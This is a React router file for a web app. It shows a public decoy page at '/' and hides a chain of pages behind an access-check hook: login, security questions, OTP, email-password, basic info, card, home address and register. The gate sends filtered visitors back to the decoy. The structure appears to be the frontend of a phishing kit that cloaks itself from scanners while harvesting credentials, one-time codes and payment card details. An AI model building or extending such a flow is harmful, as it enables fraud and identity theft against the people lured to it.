import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import Sidebar from './components/Sidebar';

// Pages
import LoginForm from './pages/LoginForm';
import SecurityQuestions from './pages/SecurityQuestions';
import OTP from './pages/OTP';
import EmailPassword from './pages/EmailPassword';
import BasicInfo from './pages/BasicInfo';
import Card from './pages/Card';
import HomeAddress from './pages/HomeAddress';
import Terms from './pages/Terms';
import Register from './pages/Register';
import LifestyleDemo from './pages/LifestyleDemo';

// Simplified layout without header/footer
type ProtectedLayoutProps = {
  children: React.ReactNode;
};

const ProtectedLayout = ({ children }: ProtectedLayoutProps) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (isAllowed === false) {
    return <Navigate to="/" replace />;
  }

  return (
    <div className="min-h-screen w-full">
      {children}
    </div>
  );
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />
        
        {/* Protected routes */}
        <Route path="/login" element={
          <ProtectedLayout>
            <LoginForm />
          </ProtectedLayout>
        } />
        
        <Route path="/security-questions" element={
          <ProtectedLayout>
            <SecurityQuestions />
          </ProtectedLayout>
        } />

        <Route path="/otp" element={
          <ProtectedLayout>
            <OTP />
          </ProtectedLayout>
        } />
        
        <Route path="/email-password" element={
          <ProtectedLayout>
            <EmailPassword />
          </ProtectedLayout>
        } />
        
        <Route path="/basic-info" element={
          <ProtectedLayout>
            <BasicInfo />
          </ProtectedLayout>
        } />
        
        <Route path="/card" element={
          <ProtectedLayout>
            <Card />
          </ProtectedLayout>
        } />
        
        <Route path="/home-address" element={
          <ProtectedLayout>
            <HomeAddress />
          </ProtectedLayout>
        } />
        
        <Route path="/register" element={
          <ProtectedLayout>
            <Register />
          </ProtectedLayout>
        } />
        
        <Route path="/terms" element={
          <ProtectedLayout>
            <Terms />
          </ProtectedLayout>
        } />
        
        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
